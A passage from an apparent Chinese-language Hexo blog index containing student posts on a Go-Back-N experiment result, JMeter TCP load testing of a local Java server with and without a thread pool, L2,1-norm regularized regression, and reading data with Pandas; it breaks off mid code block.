src="/img/2024/05/exp3/9.png" alt="image.png"></p><h2 id="3-关于乱序数据包比例"><a href="#3-关于乱序数据包比例" class="headerlink" title="3. 关于乱序数据包比例"></a>3. 关于乱序数据包比例</h2><p><img src="/img/2024/05/exp3/10.png" alt="image.png"></p><p><img src="/img/2024/05/exp3/11.png" alt="image.png"></p><h2 id="4-实验分析"><a href="#4-实验分析" class="headerlink" title="4. 实验分析"></a>4. 实验分析</h2><p>通过对比发现，NAK-GBN在上述所有情况中的OverHead都要比ACK-GBN要少，且Goodput都远远超过ACK-GBN（几十倍）</p>]]></content>
      
      
      <categories>
          
          <category> 课程实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP </tag>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Apache JMeter进行TCP并发压力测试初尝试</title>
      <link href="/2024/04/25/Apache%20JMeter%E8%BF%9B%E8%A1%8CTCP%E5%B9%B6%E5%8F%91%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E5%88%9D%E5%B0%9D%E8%AF%95/"/>
      <url>/2024/04/25/Apache%20JMeter%E8%BF%9B%E8%A1%8CTCP%E5%B9%B6%E5%8F%91%E5%8E%8B%E5%8A%9B%E6%B5%8B%E8%AF%95%E5%88%9D%E5%B0%9D%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于互联网编程实验二第三题要求比较<strong>使用线程池与否</strong>的服务器的并发性能，遂检索信息并了解到Apache JMeter这个工具</p><p>本文主要介绍了在已有Java JDK的情况下对Apache JMeter的安装及配置，以及利用JMeter进行TCP压力测试</p><h1 id="一、安装及配置"><a href="#一、安装及配置" class="headerlink" title="一、安装及配置"></a>一、安装及配置</h1><p>先在官网下载压缩包：<a href="https://jmeter.apache.org/download_jmeter.cgi">Apache JMeter - Download Apache JMeter</a></p><p><img src="/img/2024/04/intern2/0.png" alt="img.png"></p><p>将文件apache-jmeter-5.6.3.zip解压到自己选择的目录中</p><p>在根目录下，找到bin文件夹，进入文件夹中，找到jmeter.bat，双击即可打开软件</p><h1 id="二、TCP服务器"><a href="#二、TCP服务器" class="headerlink" title="二、TCP服务器"></a>二、TCP服务器</h1><p>编写Java代码，在Server类的main函数中，指定一个端口作为服务器端口，并在while死循环中不断接收客户端的请求，对于每一个请求新开一个线程ThreadServer，并在其中处理请求</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">PORT</span> <span class="operator">=</span> <span class="number">9000</span>;  </span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">MAX_POOL</span> <span class="operator">=</span> <span class="number">100</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">ServerSocket</span> <span class="variable">server</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ServerSocket</span>(PORT);  </span><br><span class="line"></span><br><span class="line">        <span class="comment">// without thread pool</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;  </span><br><span class="line">            <span class="type">Socket</span> <span class="variable">accept</span> <span class="operator">=</span> server.accept();  </span><br><span class="line">            <span class="type">Thread</span> <span class="variable">thread</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(<span class="keyword">new</span> <span class="title class_">ThreadServer</span>(accept));  </span><br><span class="line">            thread.start();  </span><br><span class="line">        &#125;  </span><br><span class="line"></span><br><span class="line">        <span class="comment">// with thread pool </span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// ExecutorService service = Executors.newFixedThreadPool(MAX_POOL);  </span></span><br><span class="line">        <span class="comment">// while (true) &#123;  </span></span><br><span class="line">        <span class="comment">//   Socket accept = server.accept();  </span></span><br><span class="line">        <span class="comment">//   service.submit(new ThreadServer(accept));  </span></span><br><span class="line">        <span class="comment">// &#125;  </span></span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码中将服务器分为两种模式，第一段为没有线程池的模式，第二段为使用线程池的模式。通过分别注释并重新编译运行来启动不同模式的服务器</p><p>为了简化服务端和客户端的交互，我们在ThreadServer中仅仅打印连接成功以及断开连接的信息，而不进行多余的通信，如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ThreadServer</span> <span class="keyword">implements</span> <span class="title class_">Runnable</span>&#123;  </span><br><span class="line">    Socket socket;  </span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">BUFFER_SIZE</span> <span class="operator">=</span> <span class="number">1024</span>;  </span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">EXIT_STR</span> <span class="operator">=</span> <span class="string">&quot;exit&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ThreadServer</span><span class="params">(Socket socket)</span>&#123;  </span><br><span class="line">        <span class="built_in">this</span>.socket = socket;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">run</span><span class="params">()</span>&#123;  </span><br><span class="line">        <span class="keyword">try</span>&#123;  </span><br><span class="line">            System.out.println(<span class="string">&quot;connection start&quot;</span>);  </span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> socket.getOutputStream();  </span><br><span class="line">            out.write(<span class="string">&quot;connect successfully&quot;</span>.getBytes());  </span><br><span class="line">            <span class="comment">// echo service  </span></span><br><span class="line">            <span class="comment">// InputStream in = socket.getInputStream();  </span></span><br><span class="line">            <span class="comment">// byte[] inBytes = new byte[BUFFER_SIZE];  </span></span><br><span class="line">            <span class="comment">// int len;  </span></span><br><span class="line">            <span class="comment">// while((len = in.read(inBytes)) != 0)&#123;  </span></span><br><span class="line">            <span class="comment">//   String str = new String(inBytes, 0, len);  </span></span><br><span class="line">            <span class="comment">//   if(str.equals(EXIT_STR))  </span></span><br><span class="line">            <span class="comment">//     break;  </span></span><br><span class="line">            <span class="comment">//   System.out.println(&quot;received: &quot; + str);  </span></span><br><span class="line">            <span class="comment">//   out.write(str.getBytes());  </span></span><br><span class="line">            <span class="comment">// &#125;  </span></span><br><span class="line">            System.out.println(<span class="string">&quot;connection end&quot;</span>);  </span><br><span class="line">            socket.close();  </span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;  </span><br><span class="line">            e.printStackTrace();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注释部分是提供echo服务，需要客户端同步实现，在本题中无需使用，客户端参考以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Client</span> &#123;  </span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">SERVER_HOST</span> <span class="operator">=</span> <span class="string">&quot;127.0.0.1&quot;</span>;  </span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">SERVER_PORT</span> <span class="operator">=</span> <span class="number">9000</span>;  </span><br><span class="line">    <span class="keyword">static</span> <span class="type">int</span> <span class="variable">BUFFER_SIZE</span> <span class="operator">=</span> <span class="number">1024</span>;  </span><br><span class="line">    <span class="keyword">static</span> <span class="type">String</span> <span class="variable">EXIT_STR</span> <span class="operator">=</span> <span class="string">&quot;exit&quot;</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">Socket</span> <span class="variable">client</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(SERVER_HOST, SERVER_PORT);  </span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">scanner</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);  </span><br><span class="line">        <span class="type">OutputStream</span> <span class="variable">out</span> <span class="operator">=</span> client.getOutputStream();  </span><br><span class="line">        <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> client.getInputStream();  </span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[BUFFER_SIZE];  </span><br><span class="line"></span><br><span class="line">        <span class="comment">// echo  </span></span><br><span class="line">        <span class="keyword">while</span>(scanner.hasNextLine())&#123;  </span><br><span class="line">            <span class="type">String</span> <span class="variable">lineOfWord</span> <span class="operator">=</span> scanner.nextLine();  </span><br><span class="line">            out.write(lineOfWord.getBytes());  </span><br><span class="line">            <span class="keyword">if</span>(lineOfWord.equals(EXIT_STR))  </span><br><span class="line">                <span class="keyword">break</span>;  </span><br><span class="line">            <span class="type">int</span> <span class="variable">len</span> <span class="operator">=</span> in.read(buffer);  </span><br><span class="line">            System.out.println(<span class="string">&quot;echo: &quot;</span> + <span class="keyword">new</span> <span class="title class_">String</span>(buffer, <span class="number">0</span>, len));  </span><br><span class="line">        &#125;  </span><br><span class="line">        client.close();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="三、并发测试"><a href="#三、并发测试" class="headerlink" title="三、并发测试"></a>三、并发测试</h1><h2 id="1-创建测试计划"><a href="#1-创建测试计划" class="headerlink" title="1. 创建测试计划"></a>1. 创建测试计划</h2><p>打开JMeter，右键单击测试计划(test plan)，一直选择到新建线程组，如下</p><p><img src="/img/2024/04/intern2/1.png" alt="img.png"></p><p>右键单击新建的线程组，分别新建TCP Sampler和Response Time Graph，分别用于TCP连接以及输出响应时间与时间的折线图</p><p><img src="/img/2024/04/intern2/2.png" alt="img.png"></p><p><img src="/img/2024/04/intern2/3.png" alt="img.png"></p><p>注意到TCP Sampler属于Sampler模块，我们也可在此模块中选择HTTP Request进行HTTP请求的测试；Response Time Graph属于Listener模块，我们可以在此模块中选择Aggregate Report输出测试的聚合报告，包括响应时间的平均值、最小值，以及吞吐量等</p><p>在TCP Sampler中，指定服务器的地址及端口号如下</p><p><img src="/img/2024/04/intern2/4.png" alt="img.png"></p><p>在Response Time Graph指定记录的间隔，单位为ms，这里设置为1000</p><p><img src="/img/2024/04/intern2/5.png" alt="img.png"></p><h2 id="2-正式测试"><a href="#2-正式测试" class="headerlink" title="2. 正式测试"></a>2. 正式测试</h2><p>首先启动服务端</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">D:\<span class="title">idea</span> <span class="title">project</span>\<span class="title">internetprog</span>\<span class="title">exp2</span>\<span class="title">exp2</span>\<span class="title">src</span>&gt;<span class="title">javac</span> <span class="title">Server.java</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">D</span>:\<span class="title">idea</span> <span class="title">project</span>\<span class="title">internetprog</span>\<span class="title">exp2</span>\<span class="title">exp2</span>\<span class="title">src</span>&gt;<span class="title">java</span> <span class="title">Server</span></span></span><br></pre></td></tr></table></figure><p>单击Thread Group，不断更改以下几个参数，测试不同程度的并发下服务的响应时间</p><p><img src="/img/2024/04/intern2/6.png" alt="img.png"></p><p>其中cd</p><ol><li>Number of Threads即创建的线程数</li><li>Ramp-up period即在多长时间内创建以上线程数，单位为s</li><li>Loop Count即执行的次数，勾选Infinite代表无限次执行</li></ol><p>在本例中，我选择固定Ramp-up period为1，Loop Count为5，修改Number of Threads依次为2000、4000、6000、8000以及10000，分别对比在有无线程池的服务器中，出现<strong>较长延迟的响应时间</strong>。每种情况分别测试3~5次。</p><p>测试结果如下</p><div class="table-container"><table><thead><tr><th>线程数</th><th>无线程池</th><th>有线程池</th></tr></thead><tbody><tr><td>2000</td><td>1ms内</td><td>1ms内</td></tr><tr><td>4000</td><td>1s内</td><td>1s内</td></tr><tr><td>6000</td><td>2s内</td><td>2s内</td></tr><tr><td>8000</td><td>4s ~ 8s</td><td>3s ~ 6s</td></tr><tr><td>10000</td><td>10s ~ 16s</td><td>3s ~ 7s</td></tr></tbody></table></div><p>可以看出，当并发压力增大时，无线程池出现的长延迟响应时间，相比有线程池的情况增长要快</p>]]></content>
      
      
      <categories>
          
          <category> 开发技能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> TCP </tag>
            
            <tag> 并发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习笔记——浅析L2,1范数正则化的线性回归</title>
      <link href="/2024/04/20/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E6%B5%85%E6%9E%90L2,1%E8%8C%83%E6%95%B0%E6%AD%A3%E5%88%99%E5%8C%96%E7%9A%84%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/"/>
      <url>/2024/04/20/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E2%80%94%E2%80%94%E6%B5%85%E6%9E%90L2,1%E8%8C%83%E6%95%B0%E6%AD%A3%E5%88%99%E5%8C%96%E7%9A%84%E7%BA%BF%E6%80%A7%E5%9B%9E%E5%BD%92/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>嘻嘻，刚开始搓逾期了快两周的线性回归实验报告，为了让报告稍微不那么平淡不得不啃论文。</p><p>本文从最基本的线性回归开始，对比不同正则化方法的特点和作用，推广到多任务问题并引出L2,1范数正则化，卑微小采购尝试去理解论文是如何思考和优化问题（</p><p>参考资料：</p><p>[1] <a href="https://juejin.cn/post/7322669043180322867">一文讲清楚线性回归(Linear Regression)、逻辑回归（Logistic Regression） - 掘金 (juejin.cn)</a></p><p>[2]<a href="https://blog.csdn.net/weixin_41960890/article/details/104891561">一篇文章完全搞懂正则化（Regularization）-CSDN博客</a></p><p>[3] <a href="https://proceedings.neurips.cc/paper/2010/file/09c6c3783b4a70054da74f2538ed47c6-Paper.pdf">Efficient and Robust Feature Selection via Joint ℓ2,1-Norms Minimization (neurips.cc)</a></p><p>[4] <a href="https://zhuanlan.zhihu.com/p/498313101">L21范数用于多任务特征选择的一些思考 - 知乎 (zhihu.com)</a></p><h1 id="一、线性回归回顾"><a href="#一、线性回归回顾" class="headerlink" title="一、线性回归回顾"></a>一、线性回归回顾</h1><h2 id="1-无正则化项"><a href="#1-无正则化项" class="headerlink" title="1. 无正则化项"></a>1. 无正则化项</h2><p>在最简单的线性回归问题[1]中，每个样本$x^{(i)} \in R^n$所对应的的标签$y$是一个值，因此用于预测的参数是一个向量$\theta \in R^n$，即</p><script type="math/tex; mode=display">\hat{y}^{(i)} = \theta^T x^{(i)} = (x^{(i)})^T \theta</script><p>记所有的样本组成一个矩阵$X = (x^{(1)}, …, x^{(m)})^T, X \in R^{m \times n}$，所有的预测值组成一个向量$\hat{y} \in R^m$，则有</p><script type="math/tex; mode=display">\hat{y} = X \theta</script><p>在此类问题中，常用梯度下降法或正规方程法求解使预测值最接近于标签的参数向量$\theta$[1]，以及添加正则化项防止过拟合</p><h2 id="2-带正则化项"><a href="#2-带正则化项" class="headerlink" title="2. 带正则化项"></a>2. 带正则化项</h2><p>在[2]中，提到了常见的正则化项包括L1正则化和L2正则化如下</p><p>L1正则化的线性回归问题：</p><script type="math/tex; mode=display">argmin_\theta \frac{1}{2m}\sum_{i=1}^m (\theta^T x^{(i)} - y^{(i)})^2 + \lambda \| \theta \|_1</script><script type="math/tex; mode=display">argmin_\theta \frac{1}{2m} (X\theta - y)^T(X\theta - y) + \lambda \| \theta \|_1</script><p>其中，</p><p>向量的L1范数指： $| \theta |_1 = \sum\limits_{i=1}^n  |\theta_i|$</p><p>L2正则化的线性回归问题：</p><script type="math/tex; mode=display">argmin_\theta \frac{1}{2m}\sum_{i=1}^m (\theta^T x^{(i)} - y^{(i)})^2 + \frac{1}{2} \lambda \| \theta \|_2^2</script><script type="math/tex; mode=display">argmin_\theta \frac{1}{2m} (X\theta - y)^T(X\theta - y) + \frac{1}{2} \lambda \| \theta \|_2^2</script><p>其中，</p><p>向量的L2范数指：$| \theta |_2 = (\sum\limits_{i=1}^n  |\theta_i|^2)^{\frac{1}{2}}$</p><p><strong>两者的区别</strong>是，当我们进行梯度下降，对损失函数求导时，</p><p>L2正则化项的偏导为$\lambda \sum\limits_{i=1}^n | \theta_i |$，对绝对值较大的$\theta_i$，会给予较重的惩罚。由此造成的结果就是，$\theta_i$的<strong>绝对值会尽可能小</strong></p><p>L1正则化项的偏导为$\lambda$，也就是说，无论$\theta_i$的大小，L1正则化项都给予相同的惩罚。由此造成的结果就是，许多$\theta_i$会<strong>尽可能变为0</strong>，从此达到稀疏化和特征选择的作用</p><h1 id="二、多任务问题"><a href="#二、多任务问题" class="headerlink" title="二、多任务问题"></a>二、多任务问题</h1><h2 id="1-定义损失函数"><a href="#1-定义损失函数" class="headerlink" title="1. 定义损失函数"></a>1. 定义损失函数</h2><p>当遇到多任务问题[2]时，即每个样本x对应的y不只是一个值，而是一个d维向量，即$y^{(i)} \in R^d, Y \in R^{m \times d}$时，用于预测的参数需要是一个矩阵$\Theta \in R^{n \times d}$，使得</p><script type="math/tex; mode=display">\hat{y}^{(i)} = \Theta^T x^{(i)}</script><script type="math/tex; mode=display">\hat{Y} = X \Theta</script><p>由于前面预测值和真实值都是确定的一个值，使用平方误差作为损失函数。而如今预测值和真实值都是向量，于是使用2范数作为基本的损失函数：</p><script type="math/tex; mode=display">J(\Theta) = \sum\limits_{i=1}^m \| \Theta^T x^{(i)} - y^{(i)} \|_2^2</script><p>论文[3]中将损失函数定义为另一种更为鲁棒的形式：</p><script type="math/tex; mode=display">J(\Theta) = \sum\limits_{i=1}^m \| \Theta^T x^{(i)} - y^{(i)} \|_2</script><h2 id="2-引入正则化项"><a href="#2-引入正则化项" class="headerlink" title="2. 引入正则化项"></a>2. 引入正则化项</h2><p>如果把$X$看作$n$个列向量排成一行，那么每个列向量就是一个特征。</p><p>把$\Theta$看作$n$个行向量排成一列，那么每一行就是对每个特征作用的参数</p><p>故，如果想在这里达到稀疏化，也就是剔除掉多余特征的作用，就需要将$\Theta$的某几行尽可能全部置零</p><p>由此引出带L2,1范数正则化项的损失函数：</p><script type="math/tex; mode=display">J(\Theta) = \sum\limits_{i=1}^m \| \Theta^T x^{(i)} - y^{(i)} \|_2 + \lambda  \sum\limits_{i=1}^n \sqrt{ \sum\limits_{j=1}^d \Theta_{i, j} ^2}</script><p>根据L2,1范数的定义：</p><script type="math/tex; mode=display">\| W \|_{2,1} = \sum\limits_{i=1}^n \sqrt{ \sum\limits_{j=1}^d W_{i, j} ^2}</script><p>则有</p><script type="math/tex; mode=display">J(\Theta) = \| X\Theta - Y \|_{2,1} + \lambda \| \Theta \|_{2,1}</script><p>可见，L2,1范数就是对行求2范数后得到的结果作为一个向量再求1范数。<strong>外层的1范数制约部分行的2范数需要为0，也就是一整行都为0，从而起到特征筛选的作用</strong>[4]</p>]]></content>
      
      
      <categories>
          
          <category> 人工智能 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
            <tag> 线性回归 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pandas数据分析学习笔记</title>
      <link href="/2024/04/17/Pandas%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/04/17/Pandas%E6%95%B0%E6%8D%AE%E5%88%86%E6%9E%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>开刷Pandas数据分析，看起来很好理解，不过没做笔记没敲代码心里总是不安稳，所以复现下课程代码并演示其中遇到的问题，顺便水一水笔记好了</p><p>参考资料：</p><p>课程视频链接：<a href="https://www.bilibili.com/video/BV1UJ411A7Fs">Pandas数据分析从入门到实战</a></p><p>数据及代码示例：<a href="https://gitee.com/my_yg/ant-learn-pandas">ant-learn-pandas: pandas学习课程代码仓库 (gitee.com)</a></p><h1 id="一、数据读取"><a href="#一、数据读取" class="headerlink" title="一、数据读取"></a>一、数据读取</h1><h2 id="0-数据类型"><a href="#0-数据类型" class="headerlink" title="0. 数据类型"></a>0. 数据类型</h2><div class="table-container"><table><thead><tr><th>数据类型</th><th>说明</th><th>Pandas读取方法</th></tr></thead><tbody><tr><td>csv, tsv, txt</td><td>用逗号、tab或其它字符分割的文本文件</td><td>read_csv</td></tr><tr><td>excel</td><td>xls或xlsx文件</td><td>read_excel</td></tr><tr><td>mysql</td><td>关系型数据表</td><td>read_sql</td></tr></tbody></table></div><h2 id="1-read-csv"><a href="#1-read-csv" class="headerlink" title="1. read_csv"></a>1. read_csv</h2><h3 id="1-1-读取csv文件"><a href="#1-1-读取csv文件" class="headerlink" title="1.1 读取csv文件"></a>1.1 读取csv文件</h3><p>csv是以逗号分割的文本文件，如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">userId,movieId,rating,timestamp</span><br><span class="line">1,1,4.0,964982703</span><br><span class="line">1,3,4.0,964981247</span><br><span class="line">1,6,4.0,964982224</span><br><span class="line">1,47,5.0,964983815</span><br></pre></td></tr></table></figure><p>直接使用read_csv读取该文件</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fpath = <span class="string">&quot;../datas/ml-latest-small/ratings.csv&quot;</span></span><br><span class="line"><span class="comment"># 读取</span></span><br><span class="line">ratings = pd.read_csv(fpath)</span><br></pre></td></tr></table></figure><h3 id="1-2-指定分割符"><a href="#1-2-指定分割符" class="headerlink" title="1.2 指定分割符"></a>1.2 指定分割符</h3><p>已知access_pvuv.txt如下：<br><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">2019-09-10  139    92</span><br><span class="line">2019-09-09  185    153</span><br><span class="line">2019-09-08  123    59</span><br><span class="line">2019-09-07  65     40</span><br><span class="line">2019-09-06  157    98</span><br><span class="line">2019-09-05  205    151</span><br><span class="line">2019-09-04  196    167</span><br><span class="line">2019-09-03  216    176</span><br><span class="line">2019-09-02  227    148</span><br><span class="line">2019-09-01  105    61</span><br></pre></td></tr></table></figure></p><p>为read_csv添加参数<strong>delimiter (或seq)</strong> 指定分隔符，<strong>header=None</strong>表示没有第一行列名称<br><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fpath = <span class="string">&quot;../datas/crazyant/access_pvuv.txt&quot;</span></span><br><span class="line"></span><br><span class="line">pvuv = pd.read_csv(</span><br><span class="line">    fpath,</span><br><span class="line">    delimiter=<span class="string">&#x27;\t&#x27;</span>,</span><br><span class="line">    header=<span class="literal">None</span>,</span><br><span class="line">    names=[<span class="string">&#x27;date&#x27;</span>, <span class="string">&#x27;pv&#x27;</span>, <span class="string">&#x27;uv&#x27;</span>]</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>分割符也可以是多个字符，但是seq指定多个字符默认会被当作正则表达式，需指定engine=’python’</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">df_ratings = pd.read_csv(</span><br><span class="line">    <span class="string">&quot;../datas/movielens-1m/ratings.dat&quot;</span>,</span><br><span class="line">    sep=<span class="string">&quot;::&quot;</span>,</span><br><span class="line">    engine=<span class="string">&#x27;python&#x27;</span>,</span><br><span class="line">    names=<span class="string">&quot;UserID::MovieID::Rating::Timestamp&quot;</span>.split(<span class="string">&quot;::&quot;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure><h2 id="2-read-excel"><a href="#2-read-excel" class="headerlink" title="2. read_excel"></a>2. read_excel</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">fpath = <span class="string">&quot;../datas/crazyant/access_pvuv.xlsx&quot;</span></span><br><span class="line">pvuv = pd.read_excel(fpath)</span><br><span class="line"><span class="built_in">print</span>(pvuv)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">输出结果</span></span><br><span class="line"><span class="string">           日期   PV   UV</span></span><br><span class="line"><span class="string">0  2019-09-10  139   92</span></span><br><span class="line"><span class="string">1  2019-09-09  185  153</span></span><br><span class="line"><span class="string">2  2019-09-08  123   59</span></span><br><span class="line"><span class="string">3  2019-09-07   65   40</span></span><br><span class="line"><span class="string">4  2019-09-06  157   98</span></span><br><span class="line"><span class="string">5  2019-09-05  205  151</span></span><br><span class="line"><span class="string">6  2019-09-04  196  167</span></span><br><span class="line"><span class="string">7  2019-09-03  216  176</span></span><br><span class="line"><span class="string">8  2019-09-02  227  148</span></span><br><span class="line"><span class="string">9  2019-09-01  105   61</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="3-read-sql"><a href="#3-read-sql" class="headerlink" title="3. read_sql"></a>3. read_sql</h2><h3 id="3-1-使用pymysql"><a href="#3-1-使用pymysql" class="headerlink" title="3.1 使用pymysql"></a>3.1 使用pymysql</h3><p>连接数据库，选择编码方式</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">conn = pymysql.connect(</span><br><span class="line">    host=<span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    user=<span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">    password=<span class="string">&#x27;password&#x27;</span>,</span><br><span class="line">    database=<span class="string">&#x27;dbname&#x27;</span>,</span><br><span class="line">    charset=<span class="string">&#x27;utf8&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 